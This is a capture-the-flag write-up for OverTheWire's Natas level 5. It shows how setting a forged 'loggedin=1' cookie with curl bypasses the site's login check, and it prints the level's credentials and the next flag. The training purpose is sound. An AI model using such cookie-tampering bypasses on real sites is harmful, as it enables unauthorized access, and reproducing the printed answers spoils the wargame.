# CHALLENGE
Access next level"s password,GIven: \
Username: natas5 \
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK \
URL:      http://natas5.natas.labs.overthewire.org \
# SOLUTION
1.Login \
<img width="963" height="367" alt="image" src="https://github.com/user-attachments/assets/6c4ed89e-d5a5-4d38-80da-2b0d5e5ed779" /> \
 \
 What a Suprise. \
2.Hint:WElogged in but it says we are yet to log in,THat means log in didnt reflect. \
Inspect using dev tools \
<img width="962" height="928" alt="image" src="https://github.com/user-attachments/assets/0acc7896-f9d8-451a-88a2-decf6f2fd687" /> \
3.TErminal \
 -  curl -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -H "Cookie:loggedin=1" http://natas5.natas.labs.overthewire.org/ \
   <img width="931" height="564" alt="image" src="https://github.com/user-attachments/assets/bde00950-5b24-45ed-9711-14238886e498" /> \
# Flag : 0RoJwHdSKWFTYR5WuiAewauSuNaBXned



